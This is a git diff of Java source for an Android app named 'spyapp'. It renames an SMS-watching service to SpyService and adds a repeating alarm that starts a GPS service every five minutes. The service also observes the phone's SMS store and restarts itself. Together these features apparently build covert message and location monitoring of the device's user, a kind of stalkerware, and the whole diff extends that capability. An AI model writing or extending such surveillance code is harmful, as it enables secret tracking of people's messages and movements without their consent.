@@ -1,6 +1,9 @@
 package com.spyapp.android.service;
 
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.database.ContentObserver;
 import android.database.Cursor;
@@ -15,7 +18,7 @@ import com.spyapp.android.SpyApp;
 import com.spyapp.android.model.Sms;
 import com.spyapp.android.provider.SpyContracts;
 
-public class SmsService extends Service {
+public class SpyService extends Service {
 
     public static final Uri URI_SMS = Uri.parse("content://sms");
 
@@ -30,6 +33,7 @@ public class SmsService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         registerSmsObserver();
+        scheduleLocationUpdate();
         return START_STICKY;
     }
 
@@ -42,6 +46,15 @@ public class SmsService extends Service {
                     new SmsObserver(new Handler())
             );
         }
+    }
+
+    private void scheduleLocationUpdate() {
+        Intent intent = new Intent(this, GpsService.class);
+        PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, 0);
+
+        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        alarmManager.setRepeating(AlarmManager.RTC, System.currentTimeMillis(),
+                AlarmManager.INTERVAL_FIFTEEN_MINUTES / 3,  pendingIntent);
     }
 
     class SmsObserver extends ContentObserver {
